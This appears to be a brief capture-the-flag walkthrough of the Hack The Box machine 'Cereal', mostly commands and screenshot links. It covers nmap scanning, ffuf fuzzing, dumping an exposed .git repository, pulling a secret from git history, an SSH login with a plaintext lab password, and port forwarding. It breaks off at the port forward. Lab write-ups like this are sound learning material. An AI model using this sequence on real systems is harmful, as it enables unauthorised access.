```
https://10.10.10.217/login
```
![image](https://github.com/user-attachments/assets/5c7d113c-aacd-4556-8a17-01b3ca8d87b2)

```
nmap -sS -sC -sV -T5 -Pn 10.10.10.217
```
![image](https://github.com/user-attachments/assets/063c1d25-bfd8-4859-b1f2-8d9a9bfc2927)

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://10.10.10.217/FUZZ -fs 1948 -e .aspx,.php,.txt,.html,.sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://cereal.htb/FUZZ -fs 1948 -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/user-attachments/assets/6f4937eb-93eb-4c74-9195-6bb7abddaac1)

![image](https://github.com/user-attachments/assets/a6588324-e85d-4bda-a272-4515d3d54104)

```
https://source.cereal.htb/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://source.cereal.htb/FUZZ -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/user-attachments/assets/45d1d706-700a-44eb-908f-9757cf7cb270)

![image](https://github.com/user-attachments/assets/a3f6721e-9fa2-459a-a9bb-e8a2253efff4)

```
git-dumper https://source.cereal.htb/.git /home/itsec/Documents/HTB-Cereal/2
```
![image](https://github.com/user-attachments/assets/81b31c65-c0ac-4714-9e08-8287c83ae335)

```
cat UsersController.cs
cat UserService.cs
```
![image](https://github.com/user-attachments/assets/b629ff41-0599-4c81-87a3-5402448c525f)

![image](https://github.com/user-attachments/assets/9559eb56-d0a4-4154-97bd-06d8fbd7414f)

```
git log –p
secretlhfIH&FY*#oysuflkhskjfhefesf
```
![image](https://github.com/user-attachments/assets/3a125a01-fce2-4dcd-a3fb-8b7d5d431352)

![image](https://github.com/user-attachments/assets/0406c72d-9d63-45ae-bf60-9620f899015f)

```
ssh sonny@10.10.10.217
mutual.madden.manner38974
```
![image](https://github.com/user-attachments/assets/9a319608-3ec1-435b-b91b-5d46dc94256c)

```
whoami /priv
Get-ComputerInfo
```
![image](https://github.com/user-attachments/assets/803fe227-986d-4bb8-b4c5-40bb7fe2a417)


```
ssh -L 8080:127.0.0.1:8080 sonny@cereal.htb
http://localhost:8080/
```
![image](https://github.com/user-attachments/assets/4e1b7fba-30b4-4f47-89c1-f5b6d02eec86)

![image](https://github.com/user-attachments/assets/79c79330-3ca6-4eae-96bf-2811559a418c)
